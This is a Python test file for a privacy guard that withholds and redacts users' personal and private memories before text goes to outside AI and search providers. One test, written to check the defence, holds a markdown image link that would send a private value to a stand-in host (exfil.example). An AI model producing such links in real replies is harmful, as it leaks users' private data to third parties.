"""Guard: placeholders, late binding and outbound checks."""
from __future__ import annotations

import pytest

from confidant.guard import DEFAULT_POLICY, NEBIUS, REDACTED, TAVILY, Guard, WITHHELD_HEADING
from confidant.memory import MemoryStore


@pytest.fixture
def guard() -> Guard:
    """The default policy."""
    return Guard()


def test_default_policy_matches_the_spec(guard: Guard) -> None:
    assert DEFAULT_POLICY["providers"] == {
        "nebius_token_factory": ["public", "personal"], "tavily": ["public"],
        "local": ["public", "personal", "private"],
    }
    assert guard.allowed(TAVILY) == {"public"}


def test_prepare_context_shares_allowed_memories_and_withholds_the_rest(store: MemoryStore, guard: Guard) -> None:
    memories = [store.get(6), store.get(7), store.get(4), store.get(7)]
    prepared = guard.prepare_context(memories, NEBIUS)
    assert prepared.shared_ids == [6, 4] and prepared.withheld_ids == [7]
    assert prepared.context_text.splitlines() == [
        f"[m6v1] {store.get(6).text}",
        f"[m4v1] {store.get(4).text}",
        WITHHELD_HEADING,
        "⟦m7⟧ (private: health appointment, value withheld)",
    ]
    assert prepared.placeholders == {"⟦m7⟧": store.get(7)}
    assert "10:30" not in prepared.context_text


def test_web_search_provider_sees_only_public_memories(store: MemoryStore, guard: Guard) -> None:
    prepared = guard.prepare_context([store.get(2), store.get(4)], TAVILY)
    assert prepared.shared_ids == [2]
    assert "⟦m4⟧ (personal: sister's birthday, value withheld)" in prepared.context_text


def test_late_bind_fills_placeholders_locally_even_when_slightly_mangled(store: MemoryStore, guard: Guard) -> None:
    prepared = guard.prepare_context([store.get(7), store.get(11)], NEBIUS)
    bound = guard.late_bind("Tuesday: ⟦m7⟧ Thursday: ⟦ m11 ⟧ again ⟦m7v1⟧", prepared)
    assert bound == f"Tuesday: {store.get(7).text} Thursday: {store.get(11).text} again {store.get(7).text}"


def test_unknown_placeholders_stay_visible_and_are_reported(store: MemoryStore, guard: Guard) -> None:
    prepared = guard.prepare_context([store.get(7)], NEBIUS)
    text = "See ⟦m7⟧ and ⟦m99⟧."
    assert guard.late_bind(text, prepared) == f"See {store.get(7).text} and ⟦m99⟧."
    assert guard.unresolved(text, prepared) == ["⟦m99⟧"]
    segments = guard.segments(text, prepared)
    assert [(s.text, s.placeholder, s.memory.id if s.memory else None) for s in segments] == [
        ("See ", False, None), ("⟦m7⟧", True, 7), (" and ", False, None), ("⟦m99⟧", True, None), (".", False, None),
    ]


def test_clean_text_is_allowed_unchanged(store: MemoryStore, guard: Guard) -> None:
    decision = guard.check_outbound("10-day half marathon taper plan", TAVILY, store.all_current(), purpose="q")
    assert (decision.allowed, decision.redacted_text, decision.reasons, decision.withheld_ids) == (
        True, "10-day half marathon taper plan", [], [])
    assert (decision.provider, decision.purpose) == (TAVILY, "q")


def test_personal_name_and_date_never_reach_web_search(store: MemoryStore, guard: Guard) -> None:
    decision = guard.check_outbound("gift ideas for Léa turning 30 on 14 November", TAVILY, store.all_current())
    assert decision.allowed
    assert "Léa" not in decision.redacted_text and "14 November" not in decision.redacted_text
    assert decision.redacted_text.startswith("gift ideas for [withheld]")
    assert 4 in decision.withheld_ids
    assert any("m4v1 (personal: sister's birthday)" in reason for reason in decision.reasons)


@pytest.mark.parametrize("written", ["3 Nov", "November 3rd", "2026-11-03", "03/11/2026"])
def test_private_dates_are_recognised_in_any_format(store: MemoryStore, guard: Guard, written: str) -> None:
    decision = guard.check_outbound(f"Is the clinic open on {written} at 10h30?", NEBIUS, store.all_current())
    assert written not in decision.redacted_text and "10h30" not in decision.redacted_text
    assert decision.withheld_ids == [7]
    assert "removed a date and a time from m7v1 (private: health appointment)" in decision.reasons


@pytest.mark.parametrize("written", ["1180", "1 180", "1.180", "€1,180"])
def test_private_amounts_are_recognised_with_any_separator(store: MemoryStore, guard: Guard, written: str) -> None:
    decision = guard.check_outbound(f"Can I afford a flat at {written} a month?", NEBIUS, store.all_current())
    assert decision.redacted_text == f"Can I afford a flat at {REDACTED} a month?"
    assert decision.withheld_ids == [10]


def test_the_whole_private_text_is_caught_case_insensitively(store: MemoryStore, guard: Guard) -> None:
    decision = guard.check_outbound("note: MONTHLY RENT IS €1,180, PAID ON THE 5TH OF EACH MONTH", NEBIUS,
                                    store.all_current())
    assert "RENT IS" not in decision.redacted_text
    assert "the full text" in decision.reasons[0]


def test_a_query_made_only_of_private_values_is_blocked(store: MemoryStore, guard: Guard) -> None:
    decision = guard.check_outbound("3 Nov 10:30", TAVILY, store.all_current())
    assert not decision.allowed
    assert decision.reasons[-1] == "blocked: nothing meaningful would be left to send"


def test_values_the_user_declared_shareable_are_not_redacted(store: MemoryStore, guard: Guard) -> None:
    # "Lyon" is in a personal memory, but the public profile memory states it too.
    assert guard.check_outbound("running clubs in Lyon", TAVILY, store.all_current()).allowed
    assert guard.check_outbound("running clubs in Lyon", TAVILY, store.all_current()).withheld_ids == []


def test_credentials_are_redacted_even_without_memories(guard: Guard) -> None:
    decision = guard.check_outbound("my card 4111 1111 1111 1111 expired", NEBIUS)
    assert decision.allowed and "4111" not in decision.redacted_text
    assert decision.reasons == ["removed a payment card number (it passes the Luhn check)"]


def test_unknown_provider_and_bad_policy_are_rejected() -> None:
    with pytest.raises(ValueError, match="Unknown provider"):
        Guard().allowed("somewhere")
    with pytest.raises(ValueError, match="Unknown sensitivity"):
        Guard({"providers": {"x": ["secret"]}})
    custom = Guard({"providers": {"local": ["public", "personal", "private"]}})
    assert custom.allowed("local") == {"public", "personal", "private"}


def test_a_private_value_is_never_filled_into_a_link(store: MemoryStore, guard: Guard) -> None:
    prepared = guard.prepare_context([store.get(7)], NEBIUS)
    bound = guard.late_bind("Next: ⟦m7⟧ ![s](https://exfil.example/c?d=⟦m7⟧) [x](⟦m7⟧)", prepared)
    assert bound.startswith("Next: Dermatologist appointment on Tuesday 3 Nov 2026 at 10:30.")
    assert bound.count("10:30") == 1 and "d=[withheld])" in bound and "[x]([withheld])" in bound


def test_a_titled_private_name_stays_private_when_the_surname_is_also_a_shared_place(guard: Guard) -> None:
    store = MemoryStore()
    store.record("Dinner near Bellecour on Friday.", kind="event", sensitivity="personal", source_type="user",
                 source_ref="t", author="user", label="dinner")
    store.record("My new therapist is Dr Bellecour.", kind="fact", sensitivity="private", source_type="user",
                 source_ref="t", author="user", label="health")
    decision = guard.check_outbound("Book dinner near Bellecour after my session with Dr Bellecour.", NEBIUS,
                                    store.all_versions())
    assert decision.redacted_text == "Book dinner near Bellecour after my session with [withheld]."


def test_old_versions_of_a_private_memory_stay_protected(store: MemoryStore, guard: Guard) -> None:
    store.correct(7, "Dermatologist appointment moved to Wednesday 4 Nov at 9:00.", author="user",
                  source_ref="t", expected_version=1)
    decision = guard.check_outbound("Was it originally on 3 Nov at 10:30?", NEBIUS, store.all_versions())
    assert decision.redacted_text == "Was it originally on [withheld] at [withheld]?"


def test_a_shared_value_next_to_a_private_name_is_withheld_when_asked(store: MemoryStore, guard: Guard) -> None:
    store.correct(7, "Dermatologist appointment moved to Wednesday 4 Nov at 9:00.", author="user",
                  source_ref="t", expected_version=1)
    text = "Is the dermatologist appointment on 4 Nov before the product review?"
    assert guard.check_outbound(text, NEBIUS, store.all_versions()).redacted_text == text  # 4 Nov is also m6's
    strict = guard.check_outbound(text, NEBIUS, store.all_versions(), strict_ids=[7])
    assert strict.redacted_text == "Is the dermatologist appointment on [withheld] before the product review?"
